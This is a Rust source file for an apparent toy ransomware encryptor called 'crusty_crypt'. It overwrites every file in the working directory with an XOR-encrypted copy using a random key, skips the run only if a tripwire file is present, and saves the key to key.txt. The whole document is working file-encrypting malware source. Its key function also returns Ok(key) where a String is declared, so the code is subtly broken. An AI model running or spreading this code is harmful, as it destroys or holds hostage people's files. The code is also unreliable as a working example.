// Imports & Globals
use std::env::current_dir;
use std::fs::{File, read_dir};
use std::io::{Read, Write};
use std::path::{PathBuf};
use std::process::exit;
use rand::random;

const TRIPWIRE:&str = "crusty_crypt_tripwire";

fn main()
{
    // Check if OS is not Windows or UNIX
    if cfg!(not(any(target_family = "windows", target_family = "unix")))
    {
        println!("This program only supports Windows and Unix family operating systems, exiting...");
        exit(1);
    }

    // Determine the Current Working Directory (CWD)
    let path = current_dir().unwrap();

    // Save found filenames to an array
    let mut files = Vec::new();
    for entry in read_dir(path).unwrap()
    {
        let entry = entry.unwrap();
        let path = entry.path();
        files.push(path);
    }

    // Exit if there are no files
    if files.is_empty()
    {
        println!("No files found in the working directory");
        exit(1);
    }

    // Check if the tripwire file exists in files array
    let mut tripwire = false;
    for file in files.clone()
    {
        println!("{}", file.to_str().unwrap());
        if file.to_str().unwrap().contains(TRIPWIRE)
        {
            tripwire = true;
            break;
        }
    }

    if tripwire
    {
        println!("Tripwire found, exiting...");
        exit(1);
    }

    // Generate an encryption key
    let key = generate_key();

    // Encrypt each file in the array
    for file in files
    {
        if file.is_file()
        {
            println!("Encrypting file: {}", file.display());
            encrypt(file, key.to_string());
        }
    }

    // Write the key to a file
    let mut key_file = File::create("key.txt").unwrap();
    key_file.write_all(key.as_bytes()).unwrap();

    // Finish execution
    println!("All files encrypted");
}

//////////////////////////////////////
// Generates a random encryption key
//////////////////////////////////////
fn generate_key() -> String
{
    let mut key = String::new();
    for _ in 0..32
    {
        key.push(random::<char>());
    }
	
    // Return key
    Ok(key)
}

////////////////////
// Encrypts a file
////////////////////
fn encrypt(p0: PathBuf, key: String)
{
    // Open file for reading
    let mut file_read = File::open(p0.clone()).unwrap();

    // Read bytes into buffer; close targeted file
    let mut contents = Vec::new();
    file_read.read_to_end(&mut contents).unwrap();
    drop(file_read);

    // Skip file if empty
    if contents.is_empty()
    {
        println!("Skipping empty file...");
        return;
    }

    // Initialize key bytes
    let key_bytes = key.as_bytes();

    // Encrypt file contents
    let mut encrypted = Vec::new();
    let mut i = 0;
    for byte in contents
    {
        encrypted.push(byte ^ key_bytes[i]);
        i = (i + 1) % key_bytes.len();
    }
    println!("Bytes encrypted: {}", encrypted.len());

    // Open file for write
    let file_write_result = File::create(p0.clone());
    if file_write_result.is_err()
    {
        println!("Error opening file for write: {}", file_write_result.err().unwrap());
        return;
    }
    let mut file_write = file_write_result.unwrap();

    // Write encrypted contents to file
    match file_write.write_all(encrypted.as_slice())
    {
        Ok(_) => println!("File encrypted and written"),
        Err(e) => println!("Error: {}", e),
    }

    drop(file_write);
}